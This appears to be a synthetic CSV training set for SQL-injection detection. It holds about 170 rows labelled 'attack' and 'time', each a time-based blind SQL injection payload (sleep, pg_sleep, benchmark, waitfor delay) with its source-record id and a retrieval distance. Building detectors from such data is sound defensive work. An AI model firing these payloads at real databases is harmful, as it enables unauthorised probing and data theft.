id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000175,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000087,0.8688968382806341
SMOTE_000176,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,1.448118988499591
SMOTE_000177,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000081,0.2507292652404582
SMOTE_000178,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000150,0.361529197763434
SMOTE_000179,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000120,1.3545812397497314
SMOTE_000180,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000147,0.049962523544000936
SMOTE_000181,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000063,0.08970716421695009
SMOTE_000182,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000028,1.7580009850758065
SMOTE_000183,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000009,0.39997014542539033
SMOTE_000184,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000060,0.9124889839522607
SMOTE_000185,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000148,2.358295149140507
SMOTE_000186,attack,time,1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000111,0.8690414916369328
SMOTE_000187,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000023,0.8551325802483077
SMOTE_000188,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000029,0.06828193065833917
SMOTE_000189,attack,time,1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000111,0.8350772928388596
SMOTE_000190,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000005,0.2966663477396181
SMOTE_000191,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,0.5983326048236134
SMOTE_000192,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000014,0.019913721138897736
SMOTE_000193,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000140,2.551185994231761
SMOTE_000194,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,nearest_attack_euclidean,R000026,1.2972045072894212
SMOTE_000195,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000122,1.6058664459590797
SMOTE_000196,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",nearest_attack_euclidean,R000042,0.9402232091977192
SMOTE_000197,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000107,0.19073002968393
SMOTE_000198,attack,time,1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000027,2.8662829751515884
SMOTE_000199,attack,time,"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000125,0.6451050789582279
SMOTE_000200,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000113,1.2148187879272618
SMOTE_000201,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000121,0.23472333446669763
SMOTE_000202,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",nearest_attack_euclidean,R000102,1.427383368164921
SMOTE_000203,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000088,0.1229405738917555
SMOTE_000204,attack,time,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.32997279465931983
SMOTE_000205,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000003,0.3822502942350316
SMOTE_000206,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.5551434522391333
SMOTE_000207,attack,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,nearest_attack_euclidean,R000031,2.132348958717516
SMOTE_000208,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,0.4548764980369378
SMOTE_000209,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,1.2342969332498048
SMOTE_000210,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,1.8105567074884026
SMOTE_000211,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000022,2.256166907064842
SMOTE_000212,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000043,1.9402907282752146
SMOTE_000213,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000153,1.9770475377855763
SMOTE_000214,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,0.10089764312634478
SMOTE_000215,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000081,1.1413638399885138
SMOTE_000216,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000101,0.07945277772337753
SMOTE_000217,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000077,1.2997064105332863
SMOTE_000218,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,0.4509302670246716
SMOTE_000219,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000011,0.12791230578264587
SMOTE_000220,attack,time,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000139,1.7711078779840392
SMOTE_000221,attack,time,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000136,0.8836222948801248
SMOTE_000222,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000065,0.3895024425563766
SMOTE_000223,attack,time,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000070,0.4420103442041292
SMOTE_000224,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,0.09257115179480702
SMOTE_000225,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000071,1.2626471812919902
SMOTE_000226,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000131,0.6886212901883931
SMOTE_000227,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000109,0.6416517922681967
SMOTE_000228,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.6854093677448173
SMOTE_000229,attack,time,"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",nearest_attack_euclidean,R000117,1.9198060163480093
SMOTE_000230,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.24714694703696533
SMOTE_000231,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000022,0.35136688083421697
SMOTE_000232,attack,time,"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000092,0.4672105615984882
SMOTE_000233,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000122,0.719690269675028
SMOTE_000234,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000132,1.3757662821549705
SMOTE_000235,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000060,2.802627330032311
SMOTE_000236,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000064,1.633766327145683
SMOTE_000237,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000029,0.8957176579008632
SMOTE_000238,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.8693396632583573
SMOTE_000239,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000128,0.7134615632337468
SMOTE_000240,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,1.382278903074017
SMOTE_000241,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000085,1.438821204743561
SMOTE_000242,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000142,0.2215875036078518
SMOTE_000243,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000129,0.13134342622155212
SMOTE_000244,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000094,0.004136362257767696
SMOTE_000245,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000037,0.0529147208647765
SMOTE_000246,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.002580629463403708
SMOTE_000247,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000076,0.1192510970856896
SMOTE_000248,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000075,2.700058621843183
SMOTE_000249,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,1.5307049394518282
SMOTE_000250,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,0.8373154118050677
SMOTE_000251,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000035,0.4687033992084155
SMOTE_000252,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000021,2.002585154435831
SMOTE_000253,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000074,0.6035487108384944
SMOTE_000254,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.5864368236485221
SMOTE_000255,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000100,0.17199684285867478
SMOTE_000256,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.6205444765627961
SMOTE_000257,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000014,1.3306371003928985
SMOTE_000258,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,0.8422134499028415
SMOTE_000259,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000113,0.386272853408213
SMOTE_000260,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000044,0.48872071627037106
SMOTE_000261,attack,time,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000099,1.126276010280756
SMOTE_000262,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000105,0.00844068797411356
SMOTE_000263,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,1.5392115929730528
SMOTE_000264,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.47681210340407143
SMOTE_000265,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000088,2.0174288331577896
SMOTE_000266,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000035,0.036572364034251806
SMOTE_000267,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000017,0.04091896353361124
SMOTE_000268,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,1.5579255825082552
SMOTE_000269,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,0.1448645982221937
SMOTE_000270,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000128,1.483831435142065
SMOTE_000271,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000138,0.8366580095468419
SMOTE_000272,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,0.4658473526661412
SMOTE_000273,attack,time,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000124,1.745733323615666
SMOTE_000274,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000097,1.7492480888321655
SMOTE_000275,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000108,0.3496498579449718
SMOTE_000276,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.06246610174057873
SMOTE_000277,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000071,1.1346252346448236
SMOTE_000278,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000085,0.16355863804861223
SMOTE_000279,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000090,1.4486651408584201
SMOTE_000280,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000088,0.04047912590985282
SMOTE_000281,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000143,0.6564358565525727
SMOTE_000282,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000093,1.5666716851926823
SMOTE_000283,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.5908812327203211
SMOTE_000284,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000066,3.5610806766655605
SMOTE_000285,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000060,1.2496620569927845
SMOTE_000286,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000075,2.215678395741429
SMOTE_000287,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000108,2.4087757167564234
SMOTE_000288,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.42402750112832716
SMOTE_000289,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,1.0433518120199372
SMOTE_000290,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000035,0.37614073633573575
SMOTE_000291,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000106,1.8319909798324152
SMOTE_000292,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000090,0.48698434244203487
SMOTE_000293,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000108,1.416796159313955
SMOTE_000294,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.9684186820884702
SMOTE_000295,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,0.34121603558570457
SMOTE_000296,attack,time,"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000125,2.0629207123399036
SMOTE_000297,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000045,0.2605246762971281
SMOTE_000298,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.7833089175191006
SMOTE_000299,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,1.1352868760144545
SMOTE_000300,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000049,1.6970112928807557
SMOTE_000301,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000127,0.6287694893099074
SMOTE_000302,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.028591242102929314
SMOTE_000303,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R000069,0.396602454557525
SMOTE_000304,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000066,3.8603360261031696
SMOTE_000305,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000087,0.6806284109104082
SMOTE_000306,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,2.681324880821267
SMOTE_000307,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000149,0.25581729836432787
SMOTE_000308,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,1.4439123619587166
SMOTE_000309,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000128,0.35548934240642116
SMOTE_000310,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,0.7804191269971325
SMOTE_000311,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,nearest_attack_euclidean,R000026,0.34398696042130383
SMOTE_000312,attack,time,1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000083,0.5936568214983039
SMOTE_000313,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000036,1.05854498429505
SMOTE_000314,attack,time,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000070,1.4945001975950734
SMOTE_000315,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000080,0.9241743442974946
SMOTE_000316,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.4370492053136013
SMOTE_000317,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000093,0.7146157288527896
SMOTE_000318,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000156,0.01591163331129974
SMOTE_000319,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  ',nearest_attack_euclidean,R000056,0.48864077905224185
SMOTE_000320,attack,time,"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",nearest_attack_euclidean,R000117,2.1434642158860804
SMOTE_000321,attack,time,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000155,1.9351330296112719
SMOTE_000322,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000025,0.09849379637368985
SMOTE_000323,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,0.14424755186803853
SMOTE_000324,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000149,1.2613645271491707
SMOTE_000325,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000134,0.176952568016852
SMOTE_000326,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,1.0662505286292951
SMOTE_000327,attack,time,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.48082577560831097
SMOTE_000328,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000079,1.1821438340657617
SMOTE_000329,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000118,0.19728488113466003
SMOTE_000330,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000051,0.8452196909022354
SMOTE_000331,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,0.07266968579056342
SMOTE_000332,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000144,0.2654299989214077
SMOTE_000333,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,1.6209292813818945
SMOTE_000334,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,2.67389591125117
SMOTE_000335,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000087,1.5124938894431472
SMOTE_000336,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000037,0.9202137354765069
SMOTE_000337,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000109,0.3204553086287335
SMOTE_000338,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000035,1.350884163171473
SMOTE_000339,attack,time,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.8042958349676301
SMOTE_000340,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000078,0.443532654924684
SMOTE_000341,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000028,1.3450511971495687
SMOTE_000342,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000142,0.8040695433306702
SMOTE_000343,attack,time,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '",nearest_attack_euclidean,R000058,2.235348037486305
SMOTE_000344,attack,time,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000070,0.14858058865586046
SMOTE_000345,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000029,1.1823719026092763
SMOTE_000346,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,0.13108532560330924
